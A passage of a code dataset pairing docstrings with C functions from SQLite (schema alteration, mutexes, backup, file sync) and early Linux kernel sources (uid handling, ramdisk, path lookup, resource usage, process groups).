);\n\n#ifndef SQLITE_OMIT_AUTHORIZATION\n  /* Invoke the authorization callback. */\n  if( sqlite3AuthCheck(pParse, SQLITE_ALTER_TABLE, zDb, pTab->zName, 0) ){\n    return;\n  }\n#endif\n\n  /* If the default value for the new column was specified with a \n  ** literal NULL, then set pDflt to 0. This simplifies checking\n  ** for an SQL NULL default below.\n  */\n  if( pDflt && pDflt->op==TK_NULL ){\n    pDflt = 0;\n  }\n\n  /* Check that the new column is not specified as PRIMARY KEY or UNIQUE.\n  ** If there is a NOT NULL constraint, then the default value for the\n  ** column must not be NULL.\n  */\n  if( pCol->isPrimKey ){\n    sqlite3ErrorMsg(pParse, \"Cannot add a PRIMARY KEY column\");\n    return;\n  }\n  if( pNew->pIndex ){\n    sqlite3ErrorMsg(pParse, \"Cannot add a UNIQUE column\");\n    return;\n  }\n  if( (db->flags&SQLITE_ForeignKeys) && pNew->pFKey && pDflt ){\n    sqlite3ErrorMsg(pParse, \n        \"Cannot add a REFERENCES column with non-NULL default value\");\n    return;\n  }\n  if( pCol->notNull && !pDflt ){\n    sqlite3ErrorMsg(pParse, \n        \"Cannot add a NOT NULL column with default value NULL\");\n    return;\n  }\n\n  /* Ensure the default expression is something that sqlite3ValueFromExpr()\n  ** can handle (i.e. not CURRENT_TIME etc.)\n  */\n  if( pDflt ){\n    sqlite3_value *pVal;\n    if( sqlite3ValueFromExpr(db, pDflt, SQLITE_UTF8, SQLITE_AFF_NONE, &pVal) ){\n      db->mallocFailed = 1;\n      return;\n    }\n    if( !pVal ){\n      sqlite3ErrorMsg(pParse, \"Cannot add a column with non-constant default\");\n      return;\n    }\n    sqlite3ValueFree(pVal);\n  }\n\n  /* Modify the CREATE TABLE statement. */\n  zCol = sqlite3DbStrNDup(db, (char*)pColDef->z, pColDef->n);\n  if( zCol ){\n    char *zEnd = &zCol[pColDef->n-1];\n    while( zEnd>zCol && (*zEnd==';' || sqlite3Isspace(*zEnd)) ){\n      *zEnd-- = '\\0';\n    }\n    sqlite3NestedParse(pParse, \n        \"UPDATE \\\"%w\\\".%s SET \"\n          \"sql = substr(sql,1,%d) || ', ' || %Q || substr(sql,%d) \"\n        \"WHERE type = 'table' AND name = %Q\", \n      zDb, SCHEMA_TABLE(iDb), pNew->addColOffset, zCol, pNew->addColOffset+1,\n      zTab\n    );\n    sqlite3DbFree(db, zCol);\n  }\n\n  /* If the default value of the new column is NULL, then set the file\n  ** format to 2. If the default value of the new column is not NULL,\n  ** the file format becomes 3.\n  */\n  sqlite3MinimumFileFormat(pParse, iDb, pDflt ? 3 : 2);\n\n  /* Reload the schema of the modified table. */\n  reloadTableSchema(pParse, pTab, pTab->zName);\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** The sqlite3_mutex_leave() routine exits a mutex that was\n** previously entered by the same thread.  The behavior\n** is undefined if the mutex is not currently entered or\n** is not currently allocated.  SQLite will never do either.\n*/\n", "func_signal": "static void os2MutexLeave(sqlite3_mutex *p)", "code": "{\n  TID tid;\n  PID holder1;\n  ULONG holder2;\n  if( p==0 ) return;\n  assert( p->nRef>0 );\n  DosQueryMutexSem(p->mutex, &holder1, &tid, &holder2);\n  assert( p->owner==tid );\n  p->nRef--;\n  assert( p->nRef==0 || p->id==SQLITE_MUTEX_RECURSIVE );\n  DosReleaseMutexSem(p->mutex);\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Make the given Mem object MEM_Dyn.  In other words, make it so\n** that any TEXT or BLOB content is stored in memory obtained from\n** malloc().  In this way, we know that the memory is safe to be\n** overwritten or altered.\n**\n** Return SQLITE_OK on success or SQLITE_NOMEM if malloc fails.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3VdbeMemMakeWriteable(Mem *pMem)", "code": "{\n  int f;\n  assert( pMem->db==0 || sqlite3_mutex_held(pMem->db->mutex) );\n  assert( (pMem->flags&MEM_RowSet)==0 );\n  expandBlob(pMem);\n  f = pMem->flags;\n  if( (f&(MEM_Str|MEM_Blob)) && pMem->z!=pMem->zMalloc ){\n    if( sqlite3VdbeMemGrow(pMem, pMem->n + 2, 1) ){\n      return SQLITE_NOMEM;\n    }\n    pMem->z[pMem->n] = 0;\n    pMem->z[pMem->n+1] = 0;\n    pMem->flags |= MEM_Term;\n  }\n\n  return SQLITE_OK;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** This function is called after the contents of page iPage of the\n** source database have been modified. If page iPage has already been \n** copied into the destination database, then the data written to the\n** destination is now invalidated. The destination copy of iPage needs\n** to be updated with the new data before the backup operation is\n** complete.\n**\n** It is assumed that the mutex associated with the BtShared object\n** corresponding to the source database is held when this function is\n** called.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3BackupUpdate(sqlite3_backup *pBackup, Pgno iPage, const u8 *aData)", "code": "{\n  sqlite3_backup *p;                   /* Iterator variable */\n  for(p=pBackup; p; p=p->pNext){\n    assert( sqlite3_mutex_held(p->pSrc->pBt->mutex) );\n    if( !isFatalError(p->rc) && iPage<p->iNext ){\n      /* The backup process p has already copied page iPage. But now it\n      ** has been modified by a transaction on the source pager. Copy\n      ** the new data into the backup.\n      */\n      int rc = backupOnePage(p, iPage, aData);\n      assert( rc!=SQLITE_BUSY && rc!=SQLITE_LOCKED );\n      if( rc!=SQLITE_OK ){\n        p->rc = rc;\n      }\n    }\n  }\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Clear the error message in pParse, if any\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ErrorClear(Parse *pParse)", "code": "{\n  sqlite3DbFree(pParse->db, pParse->zErrMsg);\n  pParse->zErrMsg = 0;\n  pParse->nErr = 0;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Invoke the xFileControl method on a particular database.\n*/\n", "func_signal": "SQLITE_API int sqlite3_file_control(sqlite3 *db, const char *zDbName, int op, void *pArg)", "code": "{\n  int rc = SQLITE_ERROR;\n  int iDb;\n  sqlite3_mutex_enter(db->mutex);\n  if( zDbName==0 ){\n    iDb = 0;\n  }else{\n    for(iDb=0; iDb<db->nDb; iDb++){\n      if( strcmp(db->aDb[iDb].zName, zDbName)==0 ) break;\n    }\n  }\n  if( iDb<db->nDb ){\n    Btree *pBtree = db->aDb[iDb].pBt;\n    if( pBtree ){\n      Pager *pPager;\n      sqlite3_file *fd;\n      sqlite3BtreeEnter(pBtree);\n      pPager = sqlite3BtreePager(pBtree);\n      assert( pPager!=0 );\n      fd = sqlite3PagerFile(pPager);\n      assert( fd!=0 );\n      if( fd->pMethods ){\n        rc = sqlite3OsFileControl(fd, op, pArg);\n      }\n      sqlite3BtreeLeave(pBtree);\n    }\n  }\n  sqlite3_mutex_leave(db->mutex);\n  return rc;   \n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Allocate a new page object initially associated with cache pCache.\n*/\n", "func_signal": "static PgHdr1 *pcache1AllocPage(PCache1 *pCache)", "code": "{\n  int nByte = sizeof(PgHdr1) + pCache->szPage;\n  void *pPg = pcache1Alloc(nByte);\n  PgHdr1 *p;\n  if( pPg ){\n    p = PAGE_TO_PGHDR1(pCache, pPg);\n    if( pCache->bPurgeable ){\n      pcache1.nCurrentPage++;\n    }\n  }else{\n    p = 0;\n  }\n  return p;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Make sure all writes to a particular file are committed to disk.\n**\n** If dataOnly==0 then both the file itself and its metadata (file\n** size, access time, etc) are synced.  If dataOnly!=0 then only the\n** file data is synced.\n**\n** Under Unix, also make sure that the directory entry for the file\n** has been created by fsync-ing the directory that contains the file.\n** If we do not do this and we encounter a power failure, the directory\n** entry for the journal might not exist after we reboot.  The next\n** SQLite to access the file will not know that the journal exists (because\n** the directory entry for the journal was never created) and the transaction\n** will not roll back - possibly leading to database corruption.\n*/\n", "func_signal": "static int unixSync(sqlite3_file *id, int flags)", "code": "{\n  int rc;\n  unixFile *pFile = (unixFile*)id;\n\n  int isDataOnly = (flags&SQLITE_SYNC_DATAONLY);\n  int isFullsync = (flags&0x0F)==SQLITE_SYNC_FULL;\n\n  /* Check that one of SQLITE_SYNC_NORMAL or FULL was passed */\n  assert((flags&0x0F)==SQLITE_SYNC_NORMAL\n      || (flags&0x0F)==SQLITE_SYNC_FULL\n  );\n\n  /* Unix cannot, but some systems may return SQLITE_FULL from here. This\n  ** line is to test that doing so does not cause any problems.\n  */\n  SimulateDiskfullError( return SQLITE_FULL );\n\n  assert( pFile );\n  OSTRACE2(\"SYNC    %-3d\\n\", pFile->h);\n  rc = full_fsync(pFile->h, isFullsync, isDataOnly);\n  SimulateIOError( rc=1 );\n  if( rc ){\n    pFile->lastErrno = errno;\n    return SQLITE_IOERR_FSYNC;\n  }\n  if( pFile->dirfd>=0 ){\n    int err;\n    OSTRACE4(\"DIRSYNC %-3d (have_fullfsync=%d fullsync=%d)\\n\", pFile->dirfd,\n            HAVE_FULLFSYNC, isFullsync);\n#ifndef SQLITE_DISABLE_DIRSYNC\n    /* The directory sync is only attempted if full_fsync is\n    ** turned off or unavailable.  If a full_fsync occurred above,\n    ** then the directory sync is superfluous.\n    */\n    if( (!HAVE_FULLFSYNC || !isFullsync) && full_fsync(pFile->dirfd,0,0) ){\n       /*\n       ** We have received multiple reports of fsync() returning\n       ** errors when applied to directories on certain file systems.\n       ** A failed directory sync is not a big deal.  So it seems\n       ** better to ignore the error.  Ticket #1657\n       */\n       /* pFile->lastErrno = errno; */\n       /* return SQLITE_IOERR; */\n    }\n#endif\n    err = close(pFile->dirfd); /* Only need to sync once, so close the */\n    if( err==0 ){              /* directory when we are done */\n      pFile->dirfd = -1;\n    }else{\n      pFile->lastErrno = errno;\n      rc = SQLITE_IOERR_DIR_CLOSE;\n    }\n  }\n  return rc;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Check to make sure the given table is writable.  If it is not\n** writable, generate an error message and return 1.  If it is\n** writable return 0;\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3IsReadOnly(Parse *pParse, Table *pTab, int viewOk)", "code": "{\n  /* A table is not writable under the following circumstances:\n  **\n  **   1) It is a virtual table and no implementation of the xUpdate method\n  **      has been provided, or\n  **   2) It is a system table (i.e. sqlite_master), this call is not\n  **      part of a nested parse and writable_schema pragma has not \n  **      been specified.\n  **\n  ** In either case leave an error message in pParse and return non-zero.\n  */\n  if( ( IsVirtual(pTab) \n     && sqlite3GetVTable(pParse->db, pTab)->pMod->pModule->xUpdate==0 )\n   || ( (pTab->tabFlags & TF_Readonly)!=0\n     && (pParse->db->flags & SQLITE_WriteSchema)==0\n     && pParse->nested==0 )\n  ){\n    sqlite3ErrorMsg(pParse, \"table %s may not be modified\", pTab->zName);\n    return 1;\n  }\n\n#ifndef SQLITE_OMIT_VIEW\n  if( !viewOk && pTab->pSelect ){\n    sqlite3ErrorMsg(pParse,\"cannot modify %s because it is a view\",pTab->zName);\n    return 1;\n  }\n#endif\n  return 0;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Return non-zero if the table pTab in database iDb or any of its indices\n** have been opened at any point in the VDBE program beginning at location\n** iStartAddr throught the end of the program.  This is used to see if \n** a statement of the form  \"INSERT INTO <iDb, pTab> SELECT ...\" can \n** run without using temporary table for the results of the SELECT. \n*/\n", "func_signal": "static int readsTable(Parse *p, int iStartAddr, int iDb, Table *pTab)", "code": "{\n  Vdbe *v = sqlite3GetVdbe(p);\n  int i;\n  int iEnd = sqlite3VdbeCurrentAddr(v);\n#ifndef SQLITE_OMIT_VIRTUALTABLE\n  VTable *pVTab = IsVirtual(pTab) ? sqlite3GetVTable(p->db, pTab) : 0;\n#endif\n\n  for(i=iStartAddr; i<iEnd; i++){\n    VdbeOp *pOp = sqlite3VdbeGetOp(v, i);\n    assert( pOp!=0 );\n    if( pOp->opcode==OP_OpenRead && pOp->p3==iDb ){\n      Index *pIndex;\n      int tnum = pOp->p2;\n      if( tnum==pTab->tnum ){\n        return 1;\n      }\n      for(pIndex=pTab->pIndex; pIndex; pIndex=pIndex->pNext){\n        if( tnum==pIndex->tnum ){\n          return 1;\n        }\n      }\n    }\n#ifndef SQLITE_OMIT_VIRTUALTABLE\n    if( pOp->opcode==OP_VOpen && pOp->p4.pVtab==pVTab ){\n      assert( pOp->p4.pVtab!=0 );\n      assert( pOp->p4type==P4_VTAB );\n      return 1;\n    }\n#endif\n  }\n  return 0;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n * Unprivileged users may change the real user id to the effective uid\n * or vice versa.  (BSD-style)\n *\n * When you set the effective uid, it sets the saved uid too.  This \n * makes it possible for a setuid program to completely drop its privileges,\n * which is often a useful assertion to make when you are doing a security\n * audit over a program.\n *\n * The general idea is that a program which uses just setreuid() will be\n * 100% compatible with BSD.  A program which uses just setuid() will be\n * 100% compatible with POSIX w/ Saved ID's. \n */\n", "func_signal": "int sys_setreuid(int ruid, int euid)", "code": "{\n\tint old_ruid = current->uid;\n\t\n\tif (ruid>0) {\n\t\tif ((current->euid==ruid) ||\n                    (old_ruid == ruid) ||\n\t\t    suser())\n\t\t\tcurrent->uid = ruid;\n\t\telse\n\t\t\treturn(-EPERM);\n\t}\n\tif (euid>0) {\n\t\tif ((old_ruid == euid) ||\n                    (current->euid == euid) ||\n\t\t    suser()) {\n\t\t\tcurrent->euid = euid;\n\t\t\tcurrent->suid = euid;\n\t\t} else {\n\t\t\tcurrent->uid = old_ruid;\n\t\t\treturn(-EPERM);\n\t\t}\n\t}\n\treturn 0;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n* Returns amount of memory which needs to be reserved.\n*/\n/* \u06b4ramdisk \u06b4 */\n// \u0333\u02bc\u0237\u06b4\u0435\u02bc\u05b7\u0221\u3863\n", "func_signal": "long\nrd_init (long mem_start, int length)", "code": "{\n  int i;\n  char *cp;\n\n  blk_dev[MAJOR_NR].request_fn = DEVICE_REQUEST;\t// do_rd_request()\n  rd_start = (char *) mem_start;\n  rd_length = length;\n  cp = rd_start;\n  for (i = 0; i < length; i++)\n    *cp++ = '\\0';\n  return (length);\n}", "path": "data\\Linux0.11\u5185\u6838\u6e90\u4ee3\u7801\\kernel\\blk_drv\\ramdisk.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\tpermission()\n *\n * is used to check for read/write/execute permissions on a file.\n * I don't know if we should look at just the euid or both euid and\n * uid, but that should be easily changed.\n */\n", "func_signal": "static int permission(struct m_inode * inode,int mask)", "code": "{\n\tint mode = inode->i_mode;\n\n/* special case: not even root can read/write a deleted file */\n\tif (inode->i_dev && !inode->i_nlinks)\n\t\treturn 0;\n\telse if (current->euid==inode->i_uid)\n\t\tmode >>= 6;\n\telse if (current->egid==inode->i_gid)\n\t\tmode >>= 3;\n\tif (((mode & mask & 0007) == mask) || suser())\n\t\treturn 1;\n\treturn 0;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * setuid() is implemeneted like SysV w/ SAVED_IDS \n * \n * Note that SAVED_ID's is deficient in that a setuid root program\n * like sendmail, for example, cannot set its uid to be a normal \n * user and then switch back, because if you're root, setuid() sets\n * the saved uid too.  If you don't like this, blame the bright people\n * in the POSIX commmittee and/or USG.  Note that the BSD-style setreuid()\n * will allow a root program to temporarily drop privileges and be able to\n * regain them by swapping the real and effective uid.  \n */\n", "func_signal": "int sys_setuid(int uid)", "code": "{\n\tif (suser())\n\t\tcurrent->uid = current->euid = current->suid = uid;\n\telse if ((uid == current->uid) || (uid == current->suid))\n\t\tcurrent->euid = uid;\n\telse\n\t\treturn -EPERM;\n\treturn(0);\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\tadd_entry()\n *\n * adds a file entry to the specified directory, using the same\n * semantics as find_entry(). It returns NULL if it failed.\n *\n * NOTE!! The inode part of 'de' is left at 0 - which means you\n * may not sleep between calling this and putting something into\n * the entry, as someone else might have used it while you slept.\n */\n", "func_signal": "static struct buffer_head * add_entry(struct m_inode * dir,\n\tconst char * name, int namelen, struct dir_entry ** res_dir)", "code": "{\n\tint block,i;\n\tstruct buffer_head * bh;\n\tstruct dir_entry * de;\n\n\t*res_dir = NULL;\n#ifdef NO_TRUNCATE\n\tif (namelen > NAME_LEN)\n\t\treturn NULL;\n#else\n\tif (namelen > NAME_LEN)\n\t\tnamelen = NAME_LEN;\n#endif\n\tif (!namelen)\n\t\treturn NULL;\n\tif (!(block = dir->i_zone[0]))\n\t\treturn NULL;\n\tif (!(bh = bread(dir->i_dev,block)))\n\t\treturn NULL;\n\ti = 0;\n\tde = (struct dir_entry *) bh->b_data;\n\twhile (1) {\n\t\tif ((char *)de >= BLOCK_SIZE+bh->b_data) {\n\t\t\tbrelse(bh);\n\t\t\tbh = NULL;\n\t\t\tblock = create_block(dir,i/DIR_ENTRIES_PER_BLOCK);\n\t\t\tif (!block)\n\t\t\t\treturn NULL;\n\t\t\tif (!(bh = bread(dir->i_dev,block))) {\n\t\t\t\ti += DIR_ENTRIES_PER_BLOCK;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tde = (struct dir_entry *) bh->b_data;\n\t\t}\n\t\tif (i*sizeof(struct dir_entry) >= dir->i_size) {\n\t\t\tde->inode=0;\n\t\t\tdir->i_size = (i+1)*sizeof(struct dir_entry);\n\t\t\tdir->i_dirt = 1;\n\t\t\tdir->i_ctime = CURRENT_TIME;\n\t\t}\n\t\tif (!de->inode) {\n\t\t\tdir->i_mtime = CURRENT_TIME;\n\t\t\tfor (i=0; i < NAME_LEN ; i++)\n\t\t\t\tde->name[i]=(i<namelen)?get_fs_byte(name+i):0;\n\t\t\tbh->b_dirt = 1;\n\t\t\t*res_dir = de;\n\t\t\treturn bh;\n\t\t}\n\t\tde++;\n\t\ti++;\n\t}\n\tbrelse(bh);\n\treturn NULL;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\topen_namei()\n *\n * namei for open - this is in fact almost the whole open-routine.\n */\n", "func_signal": "int open_namei(const char * pathname, int flag, int mode,\n\tstruct m_inode ** res_inode)", "code": "{\n\tconst char * basename;\n\tint inr,dev,namelen;\n\tstruct m_inode * dir, *inode;\n\tstruct buffer_head * bh;\n\tstruct dir_entry * de;\n\n\tif ((flag & O_TRUNC) && !(flag & O_ACCMODE))\n\t\tflag |= O_WRONLY;\n\tmode &= 0777 & ~current->umask;\n\tmode |= I_REGULAR;\n\tif (!(dir = dir_namei(pathname,&namelen,&basename)))\n\t\treturn -ENOENT;\n\tif (!namelen) {\t\t\t/* special case: '/usr/' etc */\n\t\tif (!(flag & (O_ACCMODE|O_CREAT|O_TRUNC))) {\n\t\t\t*res_inode=dir;\n\t\t\treturn 0;\n\t\t}\n\t\tiput(dir);\n\t\treturn -EISDIR;\n\t}\n\tbh = find_entry(&dir,basename,namelen,&de);\n\tif (!bh) {\n\t\tif (!(flag & O_CREAT)) {\n\t\t\tiput(dir);\n\t\t\treturn -ENOENT;\n\t\t}\n\t\tif (!permission(dir,MAY_WRITE)) {\n\t\t\tiput(dir);\n\t\t\treturn -EACCES;\n\t\t}\n\t\tinode = new_inode(dir->i_dev);\n\t\tif (!inode) {\n\t\t\tiput(dir);\n\t\t\treturn -ENOSPC;\n\t\t}\n\t\tinode->i_uid = current->euid;\n\t\tinode->i_mode = mode;\n\t\tinode->i_dirt = 1;\n\t\tbh = add_entry(dir,basename,namelen,&de);\n\t\tif (!bh) {\n\t\t\tinode->i_nlinks--;\n\t\t\tiput(inode);\n\t\t\tiput(dir);\n\t\t\treturn -ENOSPC;\n\t\t}\n\t\tde->inode = inode->i_num;\n\t\tbh->b_dirt = 1;\n\t\tbrelse(bh);\n\t\tiput(dir);\n\t\t*res_inode = inode;\n\t\treturn 0;\n\t}\n\tinr = de->inode;\n\tdev = dir->i_dev;\n\tbrelse(bh);\n\tiput(dir);\n\tif (flag & O_EXCL)\n\t\treturn -EEXIST;\n\tif (!(inode=iget(dev,inr)))\n\t\treturn -EACCES;\n\tif ((S_ISDIR(inode->i_mode) && (flag & O_ACCMODE)) ||\n\t    !permission(inode,ACC_MODE(flag))) {\n\t\tiput(inode);\n\t\treturn -EPERM;\n\t}\n\tinode->i_atime = CURRENT_TIME;\n\tif (flag & O_TRUNC)\n\t\ttruncate(inode);\n\t*res_inode = inode;\n\treturn 0;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * It would make sense to put struct rusuage in the task_struct,\n * except that would make the task_struct be *really big*.  After\n * task_struct gets moved into malloc'ed memory, it would\n * make sense to do this.  It will make moving the rest of the information\n * a lot simpler!  (Which we're not doing right now because we're not\n * measuring them yet).\n */\n", "func_signal": "int sys_getrusage(int who, struct rusage *ru)", "code": "{\n\tstruct rusage r;\n\tunsigned long\t*lp, *lpend, *dest;\n\n\tif (who != RUSAGE_SELF && who != RUSAGE_CHILDREN)\n\t\treturn -EINVAL;\n\tverify_area(ru, sizeof *ru);\n\tmemset((char *) &r, 0, sizeof(r));\n\tif (who == RUSAGE_SELF) {\n\t\tr.ru_utime.tv_sec = CT_TO_SECS(current->utime);\n\t\tr.ru_utime.tv_usec = CT_TO_USECS(current->utime);\n\t\tr.ru_stime.tv_sec = CT_TO_SECS(current->stime);\n\t\tr.ru_stime.tv_usec = CT_TO_USECS(current->stime);\n\t} else {\n\t\tr.ru_utime.tv_sec = CT_TO_SECS(current->cutime);\n\t\tr.ru_utime.tv_usec = CT_TO_USECS(current->cutime);\n\t\tr.ru_stime.tv_sec = CT_TO_SECS(current->cstime);\n\t\tr.ru_stime.tv_usec = CT_TO_USECS(current->cstime);\n\t}\n\tlp = (unsigned long *) &r;\n\tlpend = (unsigned long *) (&r+1);\n\tdest = (unsigned long *) ru;\n\tfor (; lp < lpend; lp++, dest++) \n\t\tput_fs_long(*lp, dest);\n\treturn(0);\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * The first time we set the timezone, we will warp the clock so that\n * it is ticking GMT time instead of local time.  Presumably, \n * if someone is setting the timezone then we are running in an\n * environment where the programs understand about timezones.\n * This should be done at boot time in the /etc/rc script, as\n * soon as possible, so that the clock can be set right.  Otherwise,\n * various programs will get confused when the clock gets warped.\n */\n", "func_signal": "int sys_settimeofday(struct timeval *tv, struct timezone *tz)", "code": "{\n\tstatic int\tfirsttime = 1;\n\tvoid \t\tadjust_clock();\n\n\tif (!suser())\n\t\treturn -EPERM;\n\tif (tz) {\n\t\tsys_tz.tz_minuteswest = get_fs_long((unsigned long *) tz);\n\t\tsys_tz.tz_dsttime = get_fs_long(((unsigned long *) tz)+1);\n\t\tif (firsttime) {\n\t\t\tfirsttime = 0;\n\t\t\tif (!tv)\n\t\t\t\tadjust_clock();\n\t\t}\n\t}\n\tif (tv) {\n\t\tint sec, usec;\n\n\t\tsec = get_fs_long((unsigned long *)tv);\n\t\tusec = get_fs_long(((unsigned long *)tv)+1);\n\t\n\t\tstartup_time = sec - jiffies/HZ;\n\t\tjiffies_offset = usec * HZ / 1000000 - jiffies%HZ;\n\t}\n\treturn 0;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\tget_dir()\n *\n * Getdir traverses the pathname until it hits the topmost directory.\n * It returns NULL on failure.\n */\n", "func_signal": "static struct m_inode * get_dir(const char * pathname)", "code": "{\n\tchar c;\n\tconst char * thisname;\n\tstruct m_inode * inode;\n\tstruct buffer_head * bh;\n\tint namelen,inr,idev;\n\tstruct dir_entry * de;\n\n\tif (!current->root || !current->root->i_count)\n\t\tpanic(\"No root inode\");\n\tif (!current->pwd || !current->pwd->i_count)\n\t\tpanic(\"No cwd inode\");\n\tif ((c=get_fs_byte(pathname))=='/') {\n\t\tinode = current->root;\n\t\tpathname++;\n\t} else if (c)\n\t\tinode = current->pwd;\n\telse\n\t\treturn NULL;\t/* empty name is bad */\n\tinode->i_count++;\n\twhile (1) {\n\t\tthisname = pathname;\n\t\tif (!S_ISDIR(inode->i_mode) || !permission(inode,MAY_EXEC)) {\n\t\t\tiput(inode);\n\t\t\treturn NULL;\n\t\t}\n\t\tfor(namelen=0;(c=get_fs_byte(pathname++))&&(c!='/');namelen++)\n\t\t\t/* nothing */ ;\n\t\tif (!c)\n\t\t\treturn inode;\n\t\tif (!(bh = find_entry(&inode,thisname,namelen,&de))) {\n\t\t\tiput(inode);\n\t\t\treturn NULL;\n\t\t}\n\t\tinr = de->inode;\n\t\tidev = inode->i_dev;\n\t\tbrelse(bh);\n\t\tiput(inode);\n\t\tif (!(inode = iget(idev,inr)))\n\t\t\treturn NULL;\n\t}\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n *\tdir_namei()\n *\n * dir_namei() returns the inode of the directory of the\n * specified name, and the name within that directory.\n */\n", "func_signal": "static struct m_inode * dir_namei(const char * pathname,\n\tint * namelen, const char ** name)", "code": "{\n\tchar c;\n\tconst char * basename;\n\tstruct m_inode * dir;\n\n\tif (!(dir = get_dir(pathname)))\n\t\treturn NULL;\n\tbasename = pathname;\n\twhile ((c=get_fs_byte(pathname++)))\n\t\tif (c=='/')\n\t\t\tbasename=pathname;\n\t*namelen = pathname-basename-1;\n\t*name = basename;\n\treturn dir;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * ok, we cannot use strncmp, as the name is not in our data space.\n * Thus we'll have to use match. No big problem. Match also makes\n * some sanity tests.\n *\n * NOTE! unlike strncmp, match returns 1 for success, 0 for failure.\n */\n", "func_signal": "static int match(int len,const char * name,struct dir_entry * de)", "code": "{\n\tregister int same ;\n\n\tif (!de || !de->inode || len > NAME_LEN)\n\t\treturn 0;\n\tif (len < NAME_LEN && de->name[len])\n\t\treturn 0;\n\t__asm__(\"cld\\n\\t\"\n\t\t\"fs ; repe ; cmpsb\\n\\t\"\n\t\t\"setz %%al\"\n\t\t:\"=a\" (same)\n\t\t:\"0\" (0),\"S\" ((long) name),\"D\" ((long) de->name),\"c\" (len)\n\t\t);\n\treturn same;\n}", "path": "data\\linux-cd\\linux-0.11\\fs\\namei.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
{"docstring": "/*\n * This needs some heave checking ...\n * I just haven't get the stomach for it. I also don't fully\n * understand sessions/pgrp etc. Let somebody who does explain it.\n *\n * OK, I think I have the protection semantics right.... this is really\n * only important on a multi-user system anyway, to make sure one user\n * can't send a signal to a process owned by another.  -TYT, 12/12/91\n */\n", "func_signal": "int sys_setpgid(int pid, int pgid)", "code": "{\n\tint i; \n\n\tif (!pid)\n\t\tpid = current->pid;\n\tif (!pgid)\n\t\tpgid = current->pid;\n\tif (pgid < 0)\n\t\treturn -EINVAL;\n\tfor (i=0 ; i<NR_TASKS ; i++)\n\t\tif (task[i] && (task[i]->pid == pid) &&\n\t\t    ((task[i]->p_pptr == current) || \n\t\t     (task[i] == current))) {\n\t\t\tif (task[i]->leader)\n\t\t\t\treturn -EPERM;\n\t\t\tif ((task[i]->session != current->session) ||\n\t\t\t    ((pgid != pid) && \n\t\t\t     (session_of_pgrp(pgid) != current->session)))\n\t\t\t\treturn -EPERM;\n\t\t\ttask[i]->pgrp = pgid;\n\t\t\treturn 0;\n\t\t}\n\treturn -ESRCH;\n}", "path": "data\\linux-0.12-v5_build_for_4.8\\kernel\\sys.c", "repo_name": "wuxinxinggg/linux_kernel_driver", "stars": 41, "license": "None", "language": "c", "size": 400920}
